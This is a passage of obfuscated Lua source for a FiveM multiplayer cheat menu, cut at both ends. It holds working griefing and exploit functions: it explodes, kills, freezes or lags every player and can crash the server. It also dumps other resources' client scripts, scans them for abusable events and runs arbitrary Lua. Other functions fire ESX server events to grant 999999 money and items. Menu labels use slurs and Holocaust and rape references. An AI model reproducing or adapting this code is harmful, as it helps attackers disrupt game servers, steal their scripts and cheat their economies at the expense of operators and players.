                                               Fatasf.n.RequestNamedPtfxAsset(dict)
                                               while not Fatasf.n.HasNamedPtfxAssetLoaded(dict) do
                                                   CockT.Inv["Wait"](0)
                                               end
                                               Fatasf.n.UseParticleFxAsset(dict)
                                               Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord("ent_sht_petrol_fire", coords.x, coords.y, coords.z, 0, 0, 0, 2.0, 0, 0, 0)
                                           end
                                       end)
                                   else
                                       Fatasf.n.SetEntityProofs(Fatasf.n.GetPlayerPed(-1), false, false, false, false, false, false, false, false)
                                       Fatasf.n.SetEntityProofs(veh, false, false, false, false, false, false, false, false)
                                       Fatasf.n.SetEntityInvincible(veh, false)
                                       wwa = false
                                       Fatasf.n.DeleteEntity(veh)
                                   
                                       Fatasf.n.SetEntityInvincible(Fatasf.n.GetPlayerPed(-1), false) 
                                       CockT.Inv["Invoke"](CockT.Natives['SetPlayerInvincible'], Fatasf.n.PlayerId(), false) 
                                       Fatasf.n.SetEntityOnlyDamagedByPlayer(Fatasf.n.GetPlayerPed(-1), false) 
                                       Fatasf.n.SetEntityCanBeDamaged(Fatasf.n.GetPlayerPed(-1), true)
                                       
                                       Fatasf.n.SetEntityOnlyDamagedByPlayer(veh, false) 
                                       Fatasf.n.SetEntityCanBeDamaged(veh, true)
                                       Functions.f.FvckinDooogInvincibleglifeshit(false)
                                   end
                               end
                           end scroll = scroll + 0.015
                       end
                       if tab == "Destroyer" then
                           local scroll = 0.37 + Cock.Menu.scr_1
   
                           if CockT.Global.Zones(0.5+drag_x2, 0.465+drag_y2, 0.17, 0.45) then
                               if Fatasf.n.IsDisabledControlPressed(0, 14) and scroll > (0.37 - (17 * 0.015)) then
                                   Cock.Menu.scr_1 = Cock.Menu.scr_1 - 0.015
                               end
                               if Fatasf.n.IsDisabledControlJustPressed(0, 15) and scroll ~= 0.37 then
                                   Cock.Menu.scr_1 = Cock.Menu.scr_1 + 0.015
                               end
                           end
                           
                           
       
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Freecam',0.425, scroll, Cock.Menu.Freecam, false) then
                                   Cock.Menu.Freecam = not Cock.Menu.Freecam
                               end
                           end scroll = scroll + 0.007
   
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Fly all vehicles', 0.422, scroll, false, true) then
                                   for vehicle in Fatasf.n.EnumerateVehicles() do
                                       Fatasf.n.NetworkRequestControlOfEntity(vehicle)
                                       CockT.Inv["Invoke"](CockT.Natives['ApplyForceToEntity'], vehicle, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                                   end
                               end
                           end scroll = scroll + 0.015
   
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Rape all players', 0.422, scroll, false, true) then
                                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                       CockT.Global.RapeP(i)
                                   end
                               end
                           end scroll = scroll + 0.015
   
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Lag all players', 0.422, scroll, false, true) then
                                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                       local ped = Fatasf.n.GetPlayerPed(i)
                                       Fatasf.n.RequestNamedPtfxAsset("scr_agencyheist")
                                       pedcoords = Fatasf.n.GetEntityCoords(ped)
                                       Fatasf.n.UseParticleFxAsset("scr_agencyheist")
                                       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( "scr_fbi_dd_breach_smoke", pedcoords, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
                                       
                                       Fatasf.n.RequestNamedPtfxAsset("core")
                                       Fatasf.n.UseParticleFxAsset("core")
                                       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( "exp_air_molotov", pedcoords, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
                                   
                                       Fatasf.n.RequestNamedPtfxAsset("scr_rcbarry1")
                                       Fatasf.n.UseParticleFxAsset("scr_rcbarry1")
                                       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( "scr_alien_teleport", pedcoords, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
                                   end
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Delete all vehicles', 0.422, scroll, false, true) then
                                   for vehicle in Fatasf.n.EnumerateVehicles() do
                                       Fatasf.n.DeleteEntity(vehicle)
                                   end
                               end
                           end scroll = scroll + 0.015
   
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Explode all players', 0.422, scroll, false, true) then
                                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do  
                                       Fatasf.n.AddExplosion(Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(i)), 8, 100.0, true, false, 0.0) 
                                   end
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Taze all players', 0.422, scroll, false, true) then
                                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                       local ped = Fatasf.n.GetPlayerPed(i)
                                       local location = Fatasf.n.GetEntityCoords(ped)
                                       local dest = Fatasf.n.GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
                                       local org = Fatasf.n.GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)
                                       Fatasf.n.ShootSingleBulletBetweenCoords(org, dest, 0.0, true, Fatasf.n.GetHashKey('WEAPON_STUNGUN'), Fatasf.n.PlayerPedId(), true, false, 1.0)
                                   end
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Pounder all players', 0.422, scroll, false, true) then
                                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                       CockMenu.Main.PounderPlayers(i, 10)
                                   end
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Kill all peds', 0.422, scroll, false, true) then
                                   CockMenu.Main.killallpeds()
                               end 
                           end scroll = scroll + 0.015
       
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Tug all players', 0.422, scroll, false, true) then
                                   CockMenu.Main.TugAllPlayers()
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Enable all sirens', 0.422, scroll, false, true) then
                                   CockMenu.Main.EnableAllSirens()
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Disable all engines', 0.422, scroll, false, true) then
                                   Functions.f.DisableAllEngines()
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Custom prop on all players', 0.422, scroll, false, true) then
                                   local object =  Functions.f.CustomInput("Custom prop name", "prop_beach_fire", 25)
                                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                       CockT.Global.CustomProp(object, i)
                                   end
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Kick all from vehicle', 0.422, scroll, false, true) then
                                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                       CockT.Global.KickFromVehicle(i)
                                   end
                               end 
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Fly all peds', 0.422, scroll, false, true) then
                                   for Pped in Fatasf.n.EnumeratePeds() do
                                       Fatasf.n.NetworkRequestControlOfEntity(Pped)
                                       CockT.Inv["Invoke"](CockT.Natives['ApplyForceToEntity'], Pped, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                                   end
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Paint all vehicles', 0.422, scroll, false, true) then
                                   Cock.Menu.paintallvehs = not Cock.Menu.paintallvehs
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Cock plate on all vehicles', 0.422, scroll, false, true) then
                                   for vehs in Fatasf.n.EnumerateVehicles() do
                                       Fatasf.n.SetVehicleNumberPlateText(vehs, 'CockMenu') 
                                   end
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Sirens on All Players', 0.422, scroll, false, true) then
                                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                       CockMenu.Main.SirensOnPlayer(i)
                                   end
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Explode Grove Street', 0.422, scroll, false, true) then
                                   Cock.Menu.explodegrove = not Cock.Menu.explodegrove
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Explode Missionrow', 0.422, scroll, false, true) then
                                   Cock.Menu.explodemissionrow = not Cock.Menu.explodemissionrow
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Explode Gas Stations', 0.422, scroll, false, true) then
                                   Cock.Menu.explodeallstations = not Cock.Menu.explodeallstations
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Kill All Players', 0.422, scroll, false, true) then
                                   CockT.Global.KillAllPlayers()
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Shit rain on all', 0.422, scroll, false, true) then
                                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                       CockMenu.Main.ShitRain(i, 'pounder', 5)
                                       CockMenu.Main.ShitRain(i, 'adder', 5)
                                       CockMenu.Main.ShitRain(i, 'Submersible', 5)
                                       CockMenu.Main.ShitRain(i, 'cutter', 5)
                                       CockMenu.Main.ShitRain(i, 'faggio3', 5)
                                   end
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Auschwitz', 0.422, scroll, false, true) then
                                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                       CockT.Global.CageNew(i)
                                       Fatasf.n.AddExplosion(Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(i)), 12, 100.0, true, false, 0.0) 
                                   end
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Auschwitz v2', 0.422, scroll, false, true) then
                                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                       CockT.Global.Auschwitzv2(i)
                                   end
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Plant bomb on all vehicles', 0.422, scroll, false, true) then
                                   Cock.Menu.plantthebombonall = not Cock.Menu.plantthebombonall
                                   if Cock.Menu.plantthebombonall then
                                      for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                           if Fatasf.n.IsPedSittingInVehicle(Fatasf.n.GetPlayerPed(i), Fatasf.n.GetVehiclePedIsIn(Fatasf.n.GetPlayerPed(i), false)) then
                                               --[[ local bomb = Fatasf.n.CreateAnDui("https://cock.menu/music/bombhasbeenplanted.mp3", 1, 1, 1)
                                               CockT.Inv["Wait"](1600)
                                               Fatasf.n.DestroyDui(bomb) ]]
                                               local coords = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(i))
                                               Fatasf.n.AddExplosion(coords.x, coords.y, coords.z, 5, 100.0, true, false, 0.0)
                                           end
                                       end
                                   end
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Fuck all vehicles', 0.422, scroll, false, true) then
                                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                       Functions.f.FuckVehicle(i) 
                                   end
                               end
                           end scroll = scroll + 0.015
   
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Spawn bitch in all players vehicles', 0.422, scroll, false, true) then
                                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                       CockMenu.Main.SpawnBitch(i)
                                   end
                               end
                           end scroll = scroll + 0.015
   
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Aggressive bolivanos', 0.422, scroll, false, true) then
                                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                       CockT.Global.SpawnKillingMexico(i)
                                   end
                               end
                           end scroll = scroll + 0.015
   
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Anti KKK', 0.422, scroll, false, true) then
                                   CockT.Global.AntiKKK() 
                               end
                           end scroll = scroll + 0.015
       
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('rE sign', 0.422, scroll, false, true) then
                                   CockT.Global.redENGINEsign()
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Destroy server', 0.422, scroll, false, true) then
                                   CockT.Global.FuckServer()
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Bring closest vehicle', 0.422, scroll, false, true) then
                                   local vehicle = CockT.Inv["Invoke"](CockT.Natives['GetClosestVehicle'], Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), 15000.0, 0, 70)
                                   Fatasf.n.SetEntityCoordsNoOffset(vehicle, Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), true, true, true)
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Freeze All', 0.422, scroll, false, true) then
                                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                       Functions.f.FreezePlayer(i)
                                   end
                               end
                           end scroll = scroll + 0.025
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Lag server',0.425, scroll, Cock.Menu.lagserver, false) then
                                   Cock.Menu.lagserver = not Cock.Menu.lagserver
                               end
                           end scroll = scroll + 0.015
                           
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Taze loop all',0.425, scroll, Cock.Menu.tazeloopall, false) then
                                   Cock.Menu.tazeloopall = not Cock.Menu.tazeloopall
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Kick from vehicle loop all',0.425, scroll, Cock.Menu.kickfromvehall, false) then
                                   Cock.Menu.kickfromvehall = not Cock.Menu.kickfromvehall
                               end
                           end scroll = scroll + 0.015
                           if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Checkbox('Ear rape all',0.425, scroll, Cock.Menu.earrapeall, false) then
                                   Cock.Menu.earrapeall = not Cock.Menu.earrapeall
                               end
                           end scroll = scroll + 0.005
                           --[[if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                               if CockMenu.Main.Button('Change LS to London', 0.422, scroll, false, true) then
                                   for peds in Fatasf.n.EnumeratePeds() do
                                       if Fatasf.n.IsPedAPlayer(peds) ~= true and peds ~= Fatasf.n.PlayerPedId() then
                                           Fatasf.n.RequestControlOnce(peds)
                                           Fatasf.n.GiveWeaponToPed(peds, Fatasf.n.GetHashKey("weapon_knife"), 1, false, true)
                                           CockT.Inv["Invoke"](CockT.Natives['TaskCombatPed'], peds, peds, 0, 16)
                                       end
                                   end
                               end
                           end scroll = scroll + 0.015]]
       
                           
       
                       end
                       if tab == "resdumper" then 
                           CockMenu.Main.LoadUi()
                           local _scroll = 0.37 + Cock.Menu.scr_dump
                           if CockT.Global.Zones(0.5+drag_x2, 0.465+drag_y2, 0.17, 0.45) then
                               if Fatasf.n.IsDisabledControlPressed(0, 14) and _scroll > (0.37 - ((CockT.Inv["Invoke"](CockT.Natives["GetNumResources"])-17) * 0.015)) then
                                   Cock.Menu.scr_dump = Cock.Menu.scr_dump - 0.015
                               end
                               if Fatasf.n.IsDisabledControlJustPressed(0, 15) and _scroll ~= 0.37 then
                                   Cock.Menu.scr_dump = Cock.Menu.scr_dump + 0.015
                               end
                       
                               if _scroll >= 0.37 and _scroll <= 0.7 - 0.015 then
                                   if CockMenu.Main.Button(v, 0.422, _scroll, false, true) then
                                       tab = v..'.'
                                       CockT.Inv["Wait"](10)
                                   end
                               end _scroll = _scroll + 0.015
                           end
                           
                           for k, v in CockT.Math.pairs(Fatasf.n.GetResources()) do
                               if _scroll >= 0.37 and _scroll <= 0.7 - 0.015 then
                                   if CockMenu.Main.Button(v, 0.422, _scroll, false, true) then
                                       tab = v
                                       CockT.Inv["Wait"](10)
                                   end
                               end _scroll = _scroll + 0.015
                           end
   
                       end
                       for k, v in CockT.Math.pairs(Fatasf.n.GetResources()) do
                           if tab == v then
                               CockMenu.Main.LoadUi()
                               local work = true
                               local _yy_2 = 0.37
                              
                               for i = 0, Fatasf.n.GetNumResourceMetadata(v, "client_script")-1 do
                                   local data = Fatasf.n.GetResourceMetadata(v, "client_script", i)
                                   local script = Fatasf.n.LoadResourceFile(v, data)
                                   if script ~= nil then
                                       if CockMenu.Main.Button(data, 0.422, _yy_2, false, true) then
                                               CockT.Inv["Thread"](function()
                                                   while work and tab == v do
                                                       CockT.Inv["Wait"](0)
                                                       Fatasf.n.DrawRect(0.77, 0.45, 0.25, 0.5, 1, 1, 1, 180)
                                                       local resource = Fatasf.n.LoadResourceFile(v, data)
           
                                                       local scroll = 0.2 + Cock.Menu.scr_a
                                                       local GetAllLines = Fatasf.n.mathsplit(resource, "[^\n]+")
                                                       if Fatasf.n.IsDisabledControlPressed(0, 14) and scroll > (0.2 - ((#GetAllLines-27) * 0.015)) then
                                                           Cock.Menu.scr_a = Cock.Menu.scr_a - 0.015
                                                       end
                                                       if Fatasf.n.IsDisabledControlJustPressed(0, 15) and scroll ~= 0.2 then
                                                           Cock.Menu.scr_a = Cock.Menu.scr_a + 0.015
                                                       end
                                                       --CockT.Global.ScrollBar(Cock.Menu.scr_a)
                                                       for k, g in CockT.Math.pairs(GetAllLines) do
                                                           if scroll >= 0.2 and scroll <= 0.7 - 0.015 then
                                                               CockT.Global.DrawText(g, 0.654, scroll, true, 0.3, 4, false)
                                                           end scroll = scroll + 0.015
                                                       end
                                                       
                                                   end
                                               end)
                                           end _yy_2 = _yy_2 + 0.015
                                       end --
                                   end
                               end
                       end
                   
                       if tab == "triggerfinder" then
                           CockMenu.Main.LoadUi()
                           local scroll = 0.37 + Cock.Menu.scr_n
   
                           if CockT.Global.Zones(0.5+drag_x2, 0.465+drag_y2, 0.17, 0.45) then
                               if Fatasf.n.IsDisabledControlPressed(0, 14) and scroll > (0.3 - ((CockT.Inv["Invoke"](CockT.Natives["GetNumResources"]) - 18) * 0.015)) then
                                   Cock.Menu.scr_n = Cock.Menu.scr_n - 0.015
                               end
                               if Fatasf.n.IsDisabledControlJustPressed(0, 15) and scroll ~= 0.37 then
                                   Cock.Menu.scr_n = Cock.Menu.scr_n + 0.015
                               end
                           end
   
                           for k, v in CockT.Math.pairs(Fatasf.n.GetResources()) do
                               if scroll >= 0.37 and scroll <= 0.7 - 0.015 then
                                   if CockMenu.Main.Button(v, 0.422, scroll, false, true) then
                                       tab = v..'.'
                                       CockT.Inv["Wait"](10)
                                   end
                               end scroll = scroll + 0.015
                           end
   
                       end
   
                       for r, a in CockT.Math.pairs(Fatasf.n.GetResources()) do
                           if tab == a..'.' then
                               CockMenu.Main.LoadUi()
                               work = true
                               local _yy_2 = 0.37
                               for i = 0, Fatasf.n.GetNumResourceMetadata(a, "client_script")-1 do
                                   local data = Fatasf.n.GetResourceMetadata(a, "client_script", i)
                                   local script = Fatasf.n.LoadResourceFile(a, data)
                                   if script ~= nil then
                                       
                                           if CockMenu.Main.Button(data, 0.422, _yy_2, false, true) then
                                               CockT.Inv["Thread"](function()
                                                   while work and tab == a..'.' do
                                                       CockT.Inv["Wait"](0)
                                                       local o = 0.465
                                                       Fatasf.n.DrawRect(0.8, 0.5, 0.3, 0.1, 4, 4, 4, 180)
                                                       local resource = Fatasf.n.LoadResourceFile(a, data)
                                                       local n = CockT.Global.TriggerFinder(resource)
                                                       
                                                       for g in CockT.Strings.sgmatch(n, "[^" .. '\n' .. "]+") do
                                                           CockT.Global.DrawText(g, 0.654, o, true, 0.3, 4, false); o = o + 0.01
                                                       end
                                                   end
                                               end)
                       
                                           end _yy_2 = _yy_2 + 0.015
                                       end --
                                   end
                               end
                       end
           
                       if tab == "Lua" then
                           local y = 0.37
                           if CockMenu.Main.Button('Reload triggers', 0.422, y, false, true) then
                               CockMenu.Main.UpdateAllTriggers()
                           end y = y + 0.015
                           if CockMenu.Main.Button('Resource dumper', 0.422, y, false, true) then
                               tab = "resdumper"
                               CockT.Inv["Wait"](10)
                           end y = y + 0.015
                           if CockMenu.Main.Button('Trigger finder', 0.422, y, false, true) then
                               tab = "triggerfinder"
                               CockT.Inv["Wait"](10)
                           end y = y + 0.015
                           if CockMenu.Main.Button('Execute lua code', 0.422, y, false, true) then
                               local in1 = Functions.f.CustomInput("Code to execute", "", 1000)
                               CockT.Strings.pcall(CockT.Strings.load(in1))
                           end y = y + 0.015
                           if dynamic.TR['gopostaljob:pay2'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Money (gopostal2)', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['gopostaljob:pay2'], 999999)
                               end y = y + 0.015
                           end
                           
                           if dynamic.TR['esx_skin:openSaveableMenu'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Open skin menu', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(false, 'esx_skin:openSaveableMenu')
                               end y = y + 0.015
                           end
                           if dynamic.TR['garbagejob_pay'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Money (garbagejob)', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['garbagejob_pay'], 999999)
                               end y = y + 0.015
                           end
                           if dynamic.TR['gopostaljob:pay'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Money (gopostaljob)', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['gopostaljob:pay'], 999999)
                               end y = y + 0.015
                           end
                           if dynamic.TR['esx_blanchisseur:pay'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Money (esx_blanchisseur)', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['esx_blanchisseur:pay'], 999999)
                               end y = y + 0.015
                           end
                           if dynamic.TR['esx_pizza:pay'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Money (esx_pizza)', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['esx_pizza:pay'], 999999)
                               end y = y + 0.015
                           end
                           if dynamic.TR['esx_taxijob:success'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Money (esx_taxijob)', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['esx_taxijob:success'])
                               end y = y + 0.015
                           end
                           if dynamic.TR['drugs:stop_sell_opium'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Drugs - STOP ALL', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:stop_sell_opium'])
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:drugs:stop_process_opium'])
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:stop_feild_opium'])
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:stop_sell_weed'])
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:stop_feild_weed'])
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:stop_sell_meth'])
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:stop_process_meth'])
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:stop_feild_meth'])
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:stop_sell_coke'])
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:stop_process_coke'])
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:stop_feild_coke'])
                               end y = y + 0.015
                           end
                           if dynamic.TR['drugs:opiumsell'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Drugs - Sell Opium', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:opiumsell'])
                               end y = y + 0.015
                           end
                           if dynamic.TR['drugs:opiumprocess'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Drugs - Process Opium', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:opiumprocess'])
                               end y = y + 0.015
                           end
                           if dynamic.TR['drugs:opiumfield'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Drugs - Field Opium', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:opiumfield'])
                               end y = y + 0.015
                           end
                           if dynamic.TR['drugs:weedsell'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Drugs - Sell wead', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:weedsell'])
                               end y = y + 0.015
                           end
                           if dynamic.TR['drugs:weedprocess'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Drugs - Process wead', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:weedprocess'])
                               end y = y + 0.015
                           end
                           if dynamic.TR['drugs:weedfield'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Drugs - Field wead', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:weedfield'])
                               end y = y + 0.015
                           end
                           if dynamic.TR['coke_feild'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Drugs - Field Coke', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['coke_feild'])
                               end y = y + 0.015
                           end
                           if dynamic.TR['coke_process'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Drugs - Process Coke', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['coke_process'])
                               end y = y + 0.015
                           end
                           if dynamic.TR['coke_sell'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Drugs - Sell Coke', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['coke_sell'])
                               end y = y + 0.015
                           end
           
                           if dynamic.TR['meth_field'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Drugs - Field Meth', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['meth_field'])
                               end y = y + 0.015
                           end
                           if dynamic.TR['meth_process'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Drugs - Process Meth', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['meth_process'])
                               end y = y + 0.015
                           end
                           if dynamic.TR['meth_sell'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Drugs - Sell Meth', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['meth_sell'])
                               end y = y + 0.015
                           end
                           if dynamic.TR['stop_feild_coke'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Drugs - Stop All', 0.422, y, false, true) then
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['stop_feild_coke'])
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['stop_process_coke'])
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['stop_sell_coke'])
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['stop_feild_meth'])
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['stop_process_meth'])
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['stop_sell_meth'])
                               end y = y + 0.015
                           end
           
                           if dynamic.TR['giveitem'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Give item', 0.422, y, false, true) then
                                   local item =  Functions.f.CustomInput('Item to give', '', 30)
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['giveitem'], item)
                               end y = y + 0.015
                           end
                           if dynamic.TR['giveitem2'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Give item', 0.422, y, false, true) then
                                   local item = Functions.f.CustomInput('Item to give', '', 30)
                                   local ammount = Functions.f.CustomInput('Ammount', '', 30)
                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['giveitem2'], item, ammount)
                               end y = y + 0.015
                           end
                           if dynamic.TR['doorlock_sound1'] then
                               if CockMenu.Main.Button('~g~ESX~s~ Sound 1', 0.422, y, false, true) then
